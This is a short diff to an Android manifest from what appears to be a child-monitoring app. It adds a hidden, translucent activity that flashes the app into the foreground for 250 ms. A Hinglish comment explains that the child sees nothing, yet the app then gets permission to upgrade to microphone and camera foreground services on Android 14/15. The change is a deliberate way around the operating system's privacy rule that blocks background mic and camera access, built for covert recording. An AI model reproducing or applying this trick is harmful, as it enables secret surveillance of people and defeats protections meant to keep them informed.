@@ -66,6 +66,16 @@
             android:excludeFromRecents="true"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
 
+        <!-- Android 14/15 while-in-use FGS upgrade (mic/camera): invisible
+             activity jo 250 ms ke liye app ko foreground banati hai — bachche
+             ko KUCH nahi dikhta, par mic/camera FGS type upgrade legal ho jata hai. -->
+        <activity
+            android:name=".ui.ForegroundPokeActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+
         <service android:name=".service.MainService" android:exported="false" android:foregroundServiceType="dataSync|location|camera|microphone"/>
         <service android:name=".service.MirrorService" android:exported="false" android:foregroundServiceType="mediaProjection"/>
 
